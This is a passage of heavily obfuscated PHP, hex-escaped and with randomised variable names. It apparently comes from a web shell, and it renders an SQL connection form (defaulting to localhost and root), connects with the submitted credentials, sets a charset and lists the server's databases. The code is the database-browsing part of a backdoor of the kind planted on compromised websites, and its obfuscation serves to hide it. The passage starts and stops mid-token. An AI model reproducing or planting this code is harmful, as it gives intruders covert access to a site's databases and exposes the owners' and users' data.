echo "\x3eP\x6f\x73tgreS\x71l</\x6fpti\x6f\x6e\x3e\n\t\t\t\t\t</\x73elec\x74\x3e\x3c/\x74\x64\x3e\n\t\t\t\t\x3c\x74\x64>\x3c\x69\x6e\x70\x75\x74 typ\x65=\x74ext\x20nam\x65=\x73ql\x5f\x68\x6f\x73\x74\x20\x76al\x75\x65\x3d\x27";echo (empty($_POST["\x73\x71l\x5f\x68\x6fs\x74"])?"\x6c\x6fc\x61l\x68os\x74":htmlspecialchars($_POST["\x73\x71l\x5fho\x73t"]));echo "\x27\x3e</\x74d\x3e\n\t\t\t\t\x3ctd\x3e\x3ci\x6ep\x75\x74 \x74\x79\x70\x65=\x74\x65x\x74\x20\x6eam\x65=sql\x5fl\x6f\x67i\x6e \x76\x61lue=\x27";echo (empty($_POST["\x73q\x6c_\x6co\x67i\x6e"])?"ro\x6ft":htmlspecialchars($_POST["\x73ql_l\x6f\x67\x69n"]));echo "'\x3e</t\x64>\n\t\t\t\t\x3c\x74\x64\x3e<\x69\x6ep\x75t\x20\x74\x79pe\x3d\x74\x65x\x74\x20n\x61\x6de\x3dsq\x6c_pa\x73\x73 value\x3d'";echo (empty($_POST["\x73q\x6c_p\x61\x73s"])?"":htmlspecialchars($_POST["s\x71l\x5f\x70\x61s\x73"]));echo "\x27\x3e</td\x3e\n\t\t\t\t<\x74\x64\x3e\n\t";${$wenmabq}="\x3cin\x70\x75\x74\x20\x74\x79\x70e\x3d\x74ext\x20\x6e\x61m\x65=s\x71\x6c\x5f\x62\x61\x73e val\x75e=\x27\x27\x3e";if(isset($_POST["s\x71\x6c_ho\x73\x74"])){$jfxiqlnycrr="t\x6d\x70";if($db->connect($_POST["\x73ql\x5f\x68\x6f\x73\x74"],$_POST["\x73ql\x5f\x6c\x6f\x67in"],$_POST["sq\x6c_\x70\x61s\x73"],$_POST["\x73\x71\x6c_\x62as\x65"])){switch($_POST["\x63\x68a\x72set"]){case"\x57\x69n\x64\x6f\x77s-1\x3251":$db->setCharset("\x63\x70\x31\x325\x31");break;case"\x55T\x46-\x38":$db->setCharset("utf8");break;case"\x4bO\x49\x38-R":$db->setCharset("\x6b\x6fi\x38\x72");break;case"K\x4f\x49\x38-\x55":$db->setCharset("k\x6f\x698u");break;case"c\x70866":$db->setCharset("\x63\x70\x38\x366");break;}$db->listDbs();${"G\x4c\x4f\x42\x41\x4c\x53"}["sz\x65\x72\x68g\x68\x6e\x77\x71\x6f"]="i\x74\x65m";echo"<sel\x65\x63t n\x61me\x3dsql\x5f\x62\x61\x73\x65\x3e<\x6f\x70ti\x6fn \x76\x61l\x75e\x3d'\x27>\x3c/\x6fpt\x69o\x6e\x3e";while(${${"GL\x4f\x42\x41LS"}["s\x7a\x65\x72h\x67\x68n\x77\x71\x6f"]}=$db->fetch()){${"\x47\x4c\x4fBA\x4c\x53"}["\x66\x72\x72u\x76\x63\x71\x6f"]="\x69\x74em";${"\x47\x4cO\x